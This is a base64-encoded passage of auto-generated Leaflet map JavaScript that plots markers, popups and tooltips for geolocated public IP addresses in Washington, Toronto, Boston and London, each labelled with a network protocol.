ZGUyMzA0MWNiYWU1ODc2NzlmNTM0MjgyNi5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBMb25kb24sIFVuaXRlZCBLaW5nZG9tLCBwcm90b2NvbD1udHBgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl84MDAyY2QzNzU3Mjc0YTExOTgwNmRlMGQ5ZmJjN2YwOSA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl8xYTZiNDIzYjhjZDI0ZDlmOTE2NmIzYmFjN2ViYjdkNiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl84MDAyY2QzNzU3Mjc0YTExOTgwNmRlMGQ5ZmJjN2YwOS5zZXRJY29uKGljb25fMWE2YjQyM2I4Y2QyNGQ5ZjkxNjZiM2JhYzdlYmI3ZDYpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfODM5MzJlNzM1NjZhNGY4ZGEzMWQ5OGJjY2FjZTBmZTEgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF83MGExYTYyYzg3MDk0YjczYWI5MmU0NzE2ZGQ3YjAzYSA9ICQoYDxkaXYgaWQ9Imh0bWxfNzBhMWE2MmM4NzA5NGI3M2FiOTJlNDcxNmRkN2IwM2EiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMjM5LjIyMC4zMjxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfODM5MzJlNzM1NjZhNGY4ZGEzMWQ5OGJjY2FjZTBmZTEuc2V0Q29udGVudChodG1sXzcwYTFhNjJjODcwOTRiNzNhYjkyZTQ3MTZkZDdiMDNhKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfODAwMmNkMzc1NzI3NGExMTk4MDZkZTBkOWZiYzdmMDkuYmluZFBvcHVwKHBvcHVwXzgzOTMyZTczNTY2YTRmOGRhMzFkOThiY2NhY2UwZmUxKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl84MDAyY2QzNzU3Mjc0YTExOTgwNmRlMGQ5ZmJjN2YwOS5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzFhYjJhZWU3NGVlZTQ1ZTZiY2I2MWRjMzdkMjU3YjA4ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzkwMmJiYzU2MzdjZDQ4M2RhMWZhZjZhMDM4ZDM4NTg5ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzFhYjJhZWU3NGVlZTQ1ZTZiY2I2MWRjMzdkMjU3YjA4LnNldEljb24oaWNvbl85MDJiYmM1NjM3Y2Q0ODNkYTFmYWY2YTAzOGQzODU4OSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF83MWMzZjAyMzgyZjk0ODhkODM4YmI2MjE1NjRjMWZlYiA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzlhZTQ0NDM2MzkyNDRmNDU4NDIyZjJjM2M5NDc4NDYwID0gJChgPGRpdiBpZD0iaHRtbF85YWU0NDQzNjM5MjQ0ZjQ1ODQyMmYyYzNjOTQ3ODQ2MCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+MTMuNzEuMTcyLjEyODxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfNzFjM2YwMjM4MmY5NDg4ZDgzOGJiNjIxNTY0YzFmZWIuc2V0Q29udGVudChodG1sXzlhZTQ0NDM2MzkyNDRmNDU4NDIyZjJjM2M5NDc4NDYwKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfMWFiMmFlZTc0ZWVlNDVlNmJjYjYxZGMzN2QyNTdiMDguYmluZFBvcHVwKHBvcHVwXzcxYzNmMDIzODJmOTQ4OGQ4MzhiYjYyMTU2NGMxZmViKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl8xYWIyYWVlNzRlZWU0NWU2YmNiNjFkYzM3ZDI1N2IwOC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfYTQ0MGYwMmQwZGU0NDI3OWIwOWVlNGQ0YWYyNDUwNGIgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fNmM5MDk4NTg2YjM4NGMwNTg1NzAwMWFjZDljODk3ODQgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfYTQ0MGYwMmQwZGU0NDI3OWIwOWVlNGQ0YWYyNDUwNGIuc2V0SWNvbihpY29uXzZjOTA5ODU4NmIzODRjMDU4NTcwMDFhY2Q5Yzg5Nzg0KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzFiZDM5ZmI1YmNkZDQ0Y2ZiNjQxZTk3OTEyNTM2OTlmID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfNjFlNjJlN2RjMWRiNGRmODg0MDRmNWZjZjQ2M2I0YzggPSAkKGA8ZGl2IGlkPSJodG1sXzYxZTYyZTdkYzFkYjRkZjg4NDA0ZjVmY2Y0NjNiNGM4IiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj4xMy44OC4yNTUuMTE1PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF8xYmQzOWZiNWJjZGQ0NGNmYjY0MWU5NzkxMjUzNjk5Zi5zZXRDb250ZW50KGh0bWxfNjFlNjJlN2RjMWRiNGRmODg0MDRmNWZjZjQ2M2I0YzgpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9hNDQwZjAyZDBkZTQ0Mjc5YjA5ZWU0ZDRhZjI0NTA0Yi5iaW5kUG9wdXAocG9wdXBfMWJkMzlmYjViY2RkNDRjZmI2NDFlOTc5MTI1MzY5OWYpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2E0NDBmMDJkMGRlNDQyNzliMDllZTRkNGFmMjQ1MDRiLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl83N2RjZTczNjdjZmQ0MWZiOTAyNDVjNTVlYWVmOGI2YyA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl81ZmQ1Nzk5YWI1ODU0MTlmOTRhY2VlZjI0ZmU5ZDNlOCA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl83N2RjZTczNjdjZmQ0MWZiOTAyNDVjNTVlYWVmOGI2Yy5zZXRJY29uKGljb25fNWZkNTc5OWFiNTg1NDE5Zjk0YWNlZWYyNGZlOWQzZTgpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfYjAxNGI1MmExMGY3NDg3NTllNTNhNzQ0MzkzMDdhMTIgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF8yYzIxZjdmNjYyZGE0YjcxYjJkYWM4NWJmOWE1MjBmYiA9ICQoYDxkaXYgaWQ9Imh0bWxfMmMyMWY3ZjY2MmRhNGI3MWIyZGFjODViZjlhNTIwZmIiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMjM5LjIyMC42NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfYjAxNGI1MmExMGY3NDg3NTllNTNhNzQ0MzkzMDdhMTIuc2V0Q29udGVudChodG1sXzJjMjFmN2Y2NjJkYTRiNzFiMmRhYzg1YmY5YTUyMGZiKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfNzdkY2U3MzY3Y2ZkNDFmYjkwMjQ1YzU1ZWFlZjhiNmMuYmluZFBvcHVwKHBvcHVwX2IwMTRiNTJhMTBmNzQ4NzU5ZTUzYTc0NDM5MzA3YTEyKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl83N2RjZTczNjdjZmQ0MWZiOTAyNDVjNTVlYWVmOGI2Yy5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzc5MzU2ZTY3YWQxYjRjMTY4MGNhZDBjNGQzMzg1MzFiID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszNy43NTEsIC05Ny44MjJdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl8zMWRmZmFhMGUyY2Y0ODIzOGE4MTJhODdmMWRlNmNlNyA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl83OTM1NmU2N2FkMWI0YzE2ODBjYWQwYzRkMzM4NTMxYi5zZXRJY29uKGljb25fMzFkZmZhYTBlMmNmNDgyMzhhODEyYTg3ZjFkZTZjZTcpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfYTY2MzE0MTAxOWJlNGZhMjhkNzAyYjdmNDc1NzRkNjIgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9kY2U4ZDY5MDU2N2Q0YmI3OWM5OTgwZjRiMDZhZmRmZCA9ICQoYDxkaXYgaWQ9Imh0bWxfZGNlOGQ2OTA1NjdkNGJiNzljOTk4MGY0YjA2YWZkZmQiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBMb25naXR1ZGU9LTk3LjgyMiwgTGF0aXR1ZGU9MzcuNzUxPGJyPjIwLjM4Ljk4LjE2NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfYTY2MzE0MTAxOWJlNGZhMjhkNzAyYjdmNDc1NzRkNjIuc2V0Q29udGVudChodG1sX2RjZThkNjkwNTY3ZDRiYjc5Yzk5ODBmNGIwNmFmZGZkKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfNzkzNTZlNjdhZDFiNGMxNjgwY2FkMGM0ZDMzODUzMWIuYmluZFBvcHVwKHBvcHVwX2E2NjMxNDEwMTliZTRmYTI4ZDcwMmI3ZjQ3NTc0ZDYyKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl83OTM1NmU2N2FkMWI0YzE2ODBjYWQwYzRkMzM4NTMxYi5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBOb25lLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2I4YWI2YTUzMDdkMjRmMGQ4YmVkN2VmMGZhN2NmNjY0ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0Mi4zNTg0LCAtNzEuMDU5OF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzMxMTViYzMwZDZmYTRiNzU4ZmI3OWRjNDFiZDhlYWY0ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2I4YWI2YTUzMDdkMjRmMGQ4YmVkN2VmMGZhN2NmNjY0LnNldEljb24oaWNvbl8zMTE1YmMzMGQ2ZmE0Yjc1OGZiNzlkYzQxYmQ4ZWFmNCk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF85MTEzZDE1NDhmODA0Y2Y3ODM5MzQ1YmRmZjg0MDM3ZSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sX2UxNzJhN2Y3NzgwZDQwYjM4YmExZDI2YWFmZDNhYWVhID0gJChgPGRpdiBpZD0iaHRtbF9lMTcyYTdmNzc4MGQ0MGIzOGJhMWQyNmFhZmQzYWFlYSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPU1hc3NhY2h1c2V0dHMsIENpdHk9Qm9zdG9uLCBMb25naXR1ZGU9LTcxLjA1OTgsIExhdGl0dWRlPTQyLjM1ODQ8YnI+OTEuMTg5LjkxLjIzPGJyPnByb3RvY29sPWh0dHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzkxMTNkMTU0OGY4MDRjZjc4MzkzNDViZGZmODQwMzdlLnNldENvbnRlbnQoaHRtbF9lMTcyYTdmNzc4MGQ0MGIzOGJhMWQyNmFhZmQzYWFlYSk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2I4YWI2YTUzMDdkMjRmMGQ4YmVkN2VmMGZhN2NmNjY0LmJpbmRQb3B1cChwb3B1cF85MTEzZDE1NDhmODA0Y2Y3ODM5MzQ1YmRmZjg0MDM3ZSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfYjhhYjZhNTMwN2QyNGYwZDhiZWQ3ZWYwZmE3Y2Y2NjQuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgQm9zdG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfOTk3OGYxNjQyMDhkNDI3ZWJjYjdlYjBiNmQ3ZmIyNWUgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fOWMzMDJkYmM0Mjg0NDNkOWFkYjBlOGFjMzY1MmE0ZWMgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfOTk3OGYxNjQyMDhkNDI3ZWJjYjdlYjBiNmQ3ZmIyNWUuc2V0SWNvbihpY29uXzljMzAyZGJjNDI4NDQzZDlhZGIwZThhYzM2NTJhNGVjKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzcwZGU4MTllNDY0MDRmNTRhM2QyZmRjODYzYTZmZmU4ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfNDlmNjEwNWNhYzY0NDcyYTgyMjYyZWM5ZjA3M2VhY2YgPSAkKGA8ZGl2IGlkPSJodG1sXzQ5ZjYxMDVjYWM2NDQ3MmE4MjI2MmVjOWYwNzNlYWNmIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjIzOS4yMjAuMzI8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzcwZGU4MTllNDY0MDRmNTRhM2QyZmRjODYzYTZmZmU4LnNldENvbnRlbnQoaHRtbF80OWY2MTA1Y2FjNjQ0NzJhODIyNjJlYzlmMDczZWFjZik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzk5NzhmMTY0MjA4ZDQyN2ViY2I3ZWIwYjZkN2ZiMjVlLmJpbmRQb3B1cChwb3B1cF83MGRlODE5ZTQ2NDA0ZjU0YTNkMmZkYzg2M2E2ZmZlOCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfOTk3OGYxNjQyMDhkNDI3ZWJjYjdlYjBiNmQ3ZmIyNWUuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl80NWVjMTgzMTZjNzY0YTZkYjNjY2QwOTBkMWFhOTI2MiA9IEwubWFya2VyKAogICAgICAgICAgICBbNTEuNTE0MiwgLTAuMDkzMV0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2UzNTU1ZjU0NjJiODQwZTM4YjFlMWUzZjAzNzkwNDhmID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzQ1ZWMxODMxNmM3NjRhNmRiM2NjZDA5MGQxYWE5MjYyLnNldEljb24oaWNvbl9lMzU1NWY1NDYyYjg0MGUzOGIxZTFlM2YwMzc5MDQ4Zik7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8zMGUzNDI5NjAzNjU0NzFhODQ4ZGQzODc5ODA5ZWQ3OSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzdlOGI3OTliNTQzODQ1MGI4ODAzMDA0NTUxNzA4MTlkID0gJChgPGRpdiBpZD0iaHRtbF83ZThiNzk5YjU0Mzg0NTBiODgwMzAwNDU1MTcwODE5ZCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9R0IsIENvdW50cnlOYW1lPVVuaXRlZCBLaW5nZG9tLCBTdGF0ZT1FbmdsYW5kLCBDaXR5PUxvbmRvbiwgTG9uZ2l0dWRlPS0wLjA5MzEsIExhdGl0dWRlPTUxLjUxNDI8YnI+OTEuMTg5Ljg4LjE0OTxicj5wcm90b2NvbD1odHRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3